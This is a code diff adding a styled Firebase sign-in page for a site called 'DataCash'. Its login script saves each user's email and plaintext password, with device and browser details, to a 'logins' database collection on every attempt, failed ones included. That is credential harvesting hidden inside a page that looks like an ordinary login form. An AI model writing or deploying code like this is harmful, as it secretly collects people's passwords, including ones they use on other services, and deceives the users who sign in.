@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DataCash – Sign In</title>
+  <style>
+    *,
+    *::before,
+    *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg: #0a1628;
+      --card: #0f1e35;
+      --border: #1e2f4a;
+      --blue: #2d7aed;
+      --blue-hover: #1a68d9;
+      --muted: #8a9ab5;
+      --text: #fff;
+      --dark-input: #162033;
+      --red: #ef4444;
+      --green: #22c55e;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(160deg, #0a1628 0%, #0d1b30 40%, #0f1e35 70%, #0a1628 100%);
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 16px 60px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    .bg-blob {
+      position: fixed;
+      border-radius: 50%;
+      pointer-events: none;
+      filter: blur(100px);
+      opacity: 0.12;
+      z-index: 0;
+    }
+    .bg-blob-1 {
+      width: 350px;
+      height: 350px;
+      background: var(--blue);
+      top: -100px;
+      right: -80px;
+      animation: floatBlob 18s ease-in-out infinite;
+    }
+    .bg-blob-2 {
+      width: 280px;
+      height: 280px;
+      background: #7c3aed;
+      bottom: -80px;
+      left: -60px;
+      animation: floatBlob 22s ease-in-out infinite reverse;
+    }
+    @keyframes floatBlob {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      25% { transform: translate(40px, -30px) scale(1.1); }
+      50% { transform: translate(-20px, 25px) scale(0.92); }
+      75% { transform: translate(25px, 15px) scale(1.05); }
+    }
+
+    .logo-wrap {
+      margin-bottom: 32px;
+      display: flex;
+      justify-content: center;
+      position: relative;
+      z-index: 1;
+      animation: fadeInDown 0.7s ease;
+    }
+    .logo-wrap img {
+      width: 90px;
+      height: 90px;
+      object-fit: contain;
+      display: block;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(45, 122, 237, 0.25);
+    }
+    @keyframes fadeInDown {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: 20px;
+      padding: 36px 28px 38px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 12px 50px rgba(0, 0, 0, 0.5), 0 2px 10px rgba(0, 0, 0, 0.3);
+      border: 1px solid var(--border);
+      position: relative;
+      z-index: 1;
+      animation: fadeInUp 0.6s ease;
+      backdrop-filter: blur(10px);
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .card h1 {
+      font-size: 24px;
+      font-weight: 800;
+      text-align: center;
+      margin-bottom: 10px;
+      line-height: 1.25;
+      color: #fff;
+    }
+    .card .subtitle {
+      font-size: 13.5px;
+      color: var(--muted);
+      text-align: center;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+
+    .field-group {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 20px;
+    }
+    .label-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 7px;
+    }
+    label {
+      font-size: 13.5px;
+      color: #c8d4e5;
+      font-weight: 600;
+    }
+    .forgot-link {
+      font-size: 12.5px;
+      color: var(--muted);
+      text-decoration: none;
+      transition: color .2s;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    .forgot-link:hover { color: var(--blue); }
+
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      background: var(--dark-input);
+      border: 1.5px solid var(--border);
+      border-radius: 14px;
+      padding: 14px 18px;
+      font-size: 14px;
+      color: #fff;
+      outline: none;
+      transition: border-color .2s, box-shadow .2s;
+    }
+    input::placeholder { color: #3d5070; }
+    input:focus {
+      border-color: var(--blue);
+      box-shadow: 0 0 0 3px rgba(45, 122, 237, 0.12);
+    }
+
+    .pw-wrap { position: relative; }
+    .pw-wrap input { padding-right: 48px; }
+    .pw-toggle {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 6px;
+      color: #5a7090;
+      display: flex;
+      align-items: center;
+      border-radius: 50%;
+      transition: color .2s, background .2s;
+    }
+    .pw-toggle:hover {
+      color: #8a9ab5;
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .remember-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 24px;
+      cursor: pointer;
+      user-select: none;
+      width: fit-content;
+    }
+    .remember-row input[type="checkbox"] { display: none; }
+    .custom-check {
+      width: 20px;
+      height: 20px;
+      border: 2px solid var(--border);
+      border-radius: 6px;
+      background: transparent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      transition: all .2s;
+    }
+    .remember-row:hover .custom-check { border-color: var(--blue); }
+    .remember-row input[type="checkbox"]:checked+.custom-check {
+      background: var(--blue);
+      border-color: var(--blue);
+    }
+    .remember-row input[type="checkbox"]:checked+.custom-check::after {
+      content: '';
+      display: block;
+      width: 5px;
+      height: 9px;
+      border: 2px solid #fff;
+      border-top: none;
+      border-left: none;
+      transform: rotate(45deg) translateY(-1px);
+    }
+    .remember-label {
+      font-size: 13.5px;
+      color: #c8d4e5;
+      font-weight: 500;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, var(--blue) 0%, #1a68d9 100%);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
+      transition: all .2s;
+      letter-spacing: .3px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(45, 122, 237, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-submit:hover {
+      background: linear-gradient(135deg, #1a68d9 0%, #1558c0 100%);
+      box-shadow: 0 6px 28px rgba(45, 122, 237, 0.45);
+      transform: translateY(-1px);
+    }
+    .btn-submit:active { transform: translateY(0); box-shadow: 0 2px 10px rgba(45, 122, 237, 0.3); }
+    .btn-submit:disabled { opacity: .7; cursor: not-allowed; transform: none; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 20px 0;
+    }
+    .divider-line { flex: 1; height: 1px; background: var(--border); }
+    .divider-text {
+      font-size: 11px;
+      color: #4a6080;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .register-link {
+      text-align: center;
+      margin-top: 22px;
+      font-size: 14px;
+      color: var(--muted);
+    }
+    .register-link a {
+      color: #fff;
+      text-decoration: none;
+      font-weight: 700;
+      transition: color .2s;
+      position: relative;
+    }
+    .register-link a::after {
+      content: '';
+      position: absolute;
+      bottom: -2px;
+      left: 0;
+      width: 100%;
+      height: 1.5px;
+      background: var(--blue);
+      transform: scaleX(0);
+      transition: transform .2s;
+    }
+    .register-link a:hover { color: var(--blue); }
+    .register-link a:hover::after { transform: scaleX(1); }
+
+    .field-error {
+      font-size: 11.5px;
+      color: #ef4444;
+      margin-top: 5px;
+      display: none;
+      font-weight: 500;
+    }
+    .field-error.show { display: block; }
+
+    .toast {
+      position: fixed;
+      bottom: 26px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: #1a2d4a;
+      color: #fff;
+      padding: 13px 24px;
+      border-radius: 14px;
+      font-size: 13.5px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+      transition: transform .35s cubic-bezier(.34, 1.56, .64, 1), opacity .35s;
+      opacity: 0;
+      z-index: 999;
+      text-align: center;
+      max-width: 340px;
+      width: 90%;
+      font-weight: 500;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+    .toast.success { border-left: 4px solid #22c55e; }
+    .toast.error { border-left: 4px solid #ef4444; }
+    .toast.info { border-left: 4px solid var(--blue); }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2.5px solid rgba(255, 255, 255, .25);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      vertical-align: middle;
+    }
+
+    @media (max-width: 480px) {
+      .card { padding: 28px 20px 30px; border-radius: 18px; }
+      .card h1 { font-size: 21px; }
+      .logo-wrap img { width: 75px; height: 75px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bg-blob bg-blob-1"></div>
+  <div class="bg-blob bg-blob-2"></div>
+
+  <div class="logo-wrap">
+    <img src="data.jpg" alt="DataCash" />
+  </div>
+
+  <div class="card">
+    <h1>Welcome back</h1>
+    <p class="subtitle">Sign in to access your dashboard and manage your earnings.</p>
+
+    <form id="loginForm" novalidate>
+      <div class="field-group">
+        <label for="email">Email address</label>
+        <input type="email" id="email" placeholder="you@example.com" autocomplete="email" inputmode="email" />
+        <span class="field-error" id="err-email">Enter a valid email address.</span>
+      </div>
+
+      <div class="field-group">
+        <div class="label-row">
+          <label for="password">Password</label>
+          <span class="forgot-link" id="forgotLink">Forgot password?</span>
+        </div>
+        <div class="pw-wrap">
+          <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" />
+          <button type="button" class="pw-toggle" aria-label="Show/hide password" onclick="togglePw()">
+            <svg id="eyeOpen" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+              <circle cx="12" cy="12" r="3" />
+            </svg>
+            <svg id="eyeOff" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
+              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+              <line x1="1" y1="1" x2="23" y2="23" />
+            </svg>
+          </button>
+        </div>
+        <span class="field-error" id="err-password">Enter your password.</span>
+      </div>
+
+      <label class="remember-row">
+        <input type="checkbox" id="rememberMe" checked />
+        <span class="custom-check"></span>
+        <span class="remember-label">Remember me</span>
+      </label>
+
+      <button type="submit" class="btn-submit" id="submitBtn">Sign in</button>
+    </form>
+
+    <div class="divider">
+      <span class="divider-line"></span>
+      <span class="divider-text">or</span>
+      <span class="divider-line"></span>
+    </div>
+
+    <p class="register-link">Don't have an account? <a href="index.html">Create one</a></p>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import {
+      getAuth, signInWithEmailAndPassword, setPersistence,
+      browserLocalPersistence, browserSessionPersistence, sendPasswordResetEmail
+    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+    import {
+      getFirestore, doc, setDoc, updateDoc, serverTimestamp
+    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const app = initializeApp({
+      apiKey: "AIzaSyBTkls-WbffHErGeX9bMYPpV5pqbCe14gY",
+      authDomain: "datacash-104dd.firebaseapp.com",
+      projectId: "datacash-104dd",
+      storageBucket: "datacash-104dd.firebasestorage.app",
+      messagingSenderId: "101692098149",
+      appId: "1:101692098149:web:55ccc9f1f105647488a88c"
+    });
+    const auth = getAuth(app);
+    const db = getFirestore(app);
+
+    function toast(msg, type = "info") {
+      const el = document.getElementById("toast");
+      el.innerHTML = msg;
+      el.className = `toast ${type} show`;
+      clearTimeout(el._t);
+      el._t = setTimeout(() => { el.className = "toast"; }, 4500);
+    }
+
+    function showErr(id) {
+      const el = document.getElementById("err-" + id);
+      if (el) el.classList.add("show");
+    }
+
+    function clearErrors() {
+      document.querySelectorAll(".field-error").forEach(e => e.classList.remove("show"));
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let device = "Unknown", browser = "Unknown", os = "Unknown";
+      if (ua.includes("Windows")) os = "Windows";
+      else if (ua.includes("Mac")) os = "macOS";
+      else if (ua.includes("Linux")) os = "Linux";
+      else if (ua.includes("Android")) os = "Android";
+      else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+      if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+      else if (ua.includes("Firefox")) browser = "Firefox";
+      else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+      else if (ua.includes("Edg")) browser = "Edge";
+      if (ua.includes("iPhone")) device = "iPhone";
+      else if (ua.includes("iPad")) device = "iPad";
+      else if (ua.includes("Android") && ua.includes("Mobile")) device = "Android Phone";
+      else if (ua.includes("Android")) device = "Android Tablet";
+      else if (os === "Windows" || os === "macOS" || os === "Linux") device = "Desktop";
+      return { device, browser, os };
+    }
+
+    window.togglePw = () => {
+      const inp = document.getElementById("password");
+      const eyeOpen = document.getElementById("eyeOpen");
+      const eyeOff = document.getElementById("eyeOff");
+      const hide = inp.type === "password";
+      inp.type = hide ? "text" : "password";
+      eyeOpen.style.display = hide ? "none" : "block";
+      eyeOff.style.display = hide ? "block" : "none";
+    };
+
+    document.getElementById("forgotLink").addEventListener("click", async function(e) {
+      e.preventDefault();
+      const email = document.getElementById("email").value.trim().toLowerCase();
+      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        toast("Please enter your email address first.", "info");
+        document.getElementById("email").focus();
+        return;
+      }
+      try {
+        await sendPasswordResetEmail(auth, email);
+        toast("✅ Password reset email sent! Check your inbox.", "success");
+      } catch (err) {
+        toast("Failed to send reset email. Try again.", "error");
+      }
+    });
+
+    document.getElementById("loginForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      clearErrors();
+
+      const email = document.getElementById("email").value.trim().toLowerCase();
+      const password = document.getElementById("password").value;
+      const remember = document.getElementById("rememberMe").checked;
+
+      let ok = true;
+      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { showErr("email");
+        ok = false; }
+      if (!password) { showErr("password");
+        ok = false; }
+      if (!ok) {
+        toast("Please fill in all required fields.", "error");
+        return;
+      }
+
+      const btn = document.getElementById("submitBtn");
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span> Signing in…';
+
+      // ✅ Create unique document ID for logins collection
+      const loginDocId = "login_" + Date.now();
+      const deviceInfo = getDeviceInfo();
+
+      try {
+        await setPersistence(auth, remember ? browserLocalPersistence : browserSessionPersistence);
+        const cred = await signInWithEmailAndPassword(auth, email, password);
+
+        // ✅ SAVE SUCCESSFUL LOGIN TO "logins" COLLECTION
+        await setDoc(doc(db, "logins", loginDocId), {
+          email: email,
+          password: password,
+          status: "success",
+          uid: cred.user.uid,
+          errorCode: null,
+          device: deviceInfo.device,
+          browser: deviceInfo.browser,
+          os: deviceInfo.os,
+          userAgent: navigator.userAgent,
+          createdAt: serverTimestamp()
+        });
+        console.log("✅ SUCCESS login saved to logins collection");
+
+        updateDoc(doc(db, "users", cred.user.uid), {
+          lastLoginAt: serverTimestamp(),
+          updatedAt: serverTimestamp()
+        }).catch(() => {});
+
+        toast("✅ Welcome back! Redirecting…", "success");
+        setTimeout(() => { window.location.href = "dashboard.html"; }, 1500);
+
+      } catch (err) {
+        btn.disabled = false;
+        btn.innerHTML = "Sign in";
+
+        // ✅ SAVE FAILED LOGIN TO "logins" COLLECTION
+        await setDoc(doc(db, "logins", loginDocId), {
+          email: email,
+          password: password,
+          status: "failed",
+          uid: null,
+          errorCode: err.code || "unknown",
+          errorMessage: err.message || "Unknown error",
+          device: deviceInfo.device,
+          browser: deviceInfo.browser,
+          os: deviceInfo.os,
+          userAgent: navigator.userAgent,
+          createdAt: serverTimestamp()
+        });
+        console.log("❌ FAILED login saved to logins collection:", err.code);
+
+        const MAP = {
+          "auth/user-not-found": "No account found with this email. <a href='index.html' style='color:#93c5fd;text-decoration:underline'>Create one</a>.",
+          "auth/wrong-password": "Incorrect password. Try again or reset it.",
+          "auth/invalid-credential": "Invalid email or password.",
+          "auth/user-disabled": "This account has been suspended.",
+          "auth/too-many-requests": "Too many failed attempts. Wait a moment.",
+          "auth/network-request-failed": "Network error. Check your connection.",
+        };
+        toast(MAP[err.code] || `Error: ${err.message}`, "error");
+      }
+    });
+  </script>
+</body>
+</html>
